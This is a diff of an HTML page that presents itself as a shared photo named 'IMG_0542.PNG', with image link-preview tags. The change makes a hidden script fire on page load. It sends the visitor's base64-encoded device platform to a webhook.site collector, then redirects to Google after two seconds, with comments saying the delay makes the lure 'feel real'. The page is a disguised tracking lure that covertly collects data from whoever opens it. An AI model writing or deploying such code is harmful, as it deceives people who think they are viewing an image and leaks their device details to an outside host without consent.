@@ -3,35 +3,29 @@
 <head>
     <title>IMG_0542.PNG</title>
     <meta property="og:title" content="IMG_0542.PNG">
-    <meta property="og:description" content="Shared via iCloud">
     <meta property="og:image" content="https://raw.githubusercontent.com/bluekama/project-portfolio/main/IMG_0542.PNG">
     <meta property="og:type" content="image.png">
-    <meta name="twitter:card" content="summary_large_image">
-
+    
     <style>
-        body, html {
-            margin: 0; padding: 0; width: 100%; height: 100%;
-            background-color: black; display: flex;
-            justify-content: center; align-items: center;
-            overflow: hidden; cursor: pointer;
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: black; 
+                     display: flex; justify-content: center; align-items: center; overflow: hidden; }
         img { max-width: 100%; max-height: 100%; object-fit: contain; }
     </style>
 </head>
-<body onclick="launchPayload()">
-
+<body>
     <img src="https://raw.githubusercontent.com/bluekama/project-portfolio/main/IMG_0542.PNG">
 
     <script>
-        function launchPayload() {
-            const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
-            const ping = new Image();
-            ping.src = radar + "?event=iMessage_click&device=" + btoa(navigator.platform);
+        // TRIGGER 1: Capture data the millisecond the page starts loading
+        const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
+        const ping = new Image();
+        ping.src = radar + "?event=instant_capture&device=" + btoa(navigator.platform);
 
-            setTimeout(function() {
-                window.location.replace("https://www.google.com");
-            }, 800);
-        }
+        // TRIGGER 2: Redirect to Google automatically
+        // We give them 2 seconds to see the image so it feels "real"
+        setTimeout(function() {
+            window.location.replace("https://www.google.com");
+        }, 2000);
     </script>
 </body>
 </html>
